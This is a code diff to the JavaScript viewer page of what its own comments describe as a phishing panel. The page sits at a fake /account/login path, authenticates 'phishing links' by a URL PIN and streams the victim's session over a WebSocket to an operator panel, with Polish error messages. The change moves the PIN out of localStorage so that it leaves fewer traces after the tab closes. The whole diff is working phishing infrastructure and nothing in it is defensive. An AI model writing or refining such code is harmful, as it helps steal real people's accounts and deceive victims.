@@ -1,14 +1,11 @@
-// Viewer page — loaded at /account/login?ref=<numeric-ref>&p=<pin>
+// Viewer page — loaded at /account/login?ref=<numeric-ref>
+// Optional &p=<pin> in the URL: used for phishing links so the victim's
+// WebSocket can authenticate without a session cookie.  The PIN is never
+// written to localStorage — keeping it only in the URL ensures the browser
+// discards it when the tab is closed.
 const params = new URLSearchParams(location.search);
 const ref = params.get('ref') || '';
-
-// If PIN is embedded in the link, save it to localStorage so panel recognises the session
 const pinFromUrl = params.get('p') || '';
-if (pinFromUrl) {
-  try { localStorage.setItem('pin', pinFromUrl); } catch {}
-}
-
-function getPin() { try { return localStorage.getItem('pin') || ''; } catch { return ''; } }
 
 const viewer = new SocialPanelViewer(document.querySelector('#screen'));
 const overlay = document.querySelector('#loadingOverlay');
@@ -21,15 +18,20 @@ viewer.onReady = () => { if (overlay) overlay.classList.add('hidden'); };
 
 if (!ref) { fail('Brak ref. Wróć do panelu.'); }
 else {
-  const pin = getPin();
-  const headers = pin ? { 'x-pin': pin } : {};
-
-  fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, { method: 'POST', headers })
+  // Auth: admin uses session cookie; phishing link passes PIN in x-pin header.
+  const headers = pinFromUrl ? { 'x-pin': pinFromUrl } : {};
+  fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, {
+    method: 'POST',
+    credentials: 'same-origin',
+    headers,
+  })
     .then(async (res) => {
       if (res.status === 401) { fail('Nieprawidłowy PIN. Wróć do panelu i zaloguj się ponownie.'); return; }
       if (res.status === 404) { fail('Nieznany link.'); return; }
       const { accountId } = await res.json();
-      viewer.connect(accountId, pin);
+      // Admin (cookie auth): no PIN in WebSocket URL.
+      // Phishing link: pass PIN as query param so the WS upgrade authenticates.
+      viewer.connect(accountId, pinFromUrl || null);
     })
     .catch(() => fail('Błąd połączenia.'));
 }
